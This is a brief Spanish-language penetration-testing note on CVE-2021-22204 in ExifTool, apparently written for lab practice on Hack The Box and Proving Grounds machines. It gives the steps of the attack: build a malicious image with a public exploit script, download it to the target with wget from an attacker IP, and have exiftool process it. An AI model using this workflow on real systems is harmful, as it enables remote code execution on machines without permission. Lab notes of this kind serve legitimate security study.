## DESCRIPTION

Exiftool tiene una vulnerabilidad que permite ejecutar codigo a partir de una imagen maliciosa, existe un exploit para crear esta imgen maliciosa.

#### Mas información
* https://github.com/convisolabs/CVE-2021-22204-exiftool


## EXPLOITATION

### OPTION 1: DESDE KALI
Exploit: https://github.com/convisolabs/CVE-2021-22204-exiftool

1. Creamos la imagen maliciosa:

```
sudo python3 exploit.py 
```

2. La transferimos a la máquina:

```
wget http://192.168.45.225/image.jpg
```

3. Ejecutamos exiftool o si esta en una tarea programada se ejecutara solo pasándole esa imagen como parámetro.
## MACHINES

* Hack The Box: 
* Pg: resourced

**!!NOTA IMPORTANTE!!** 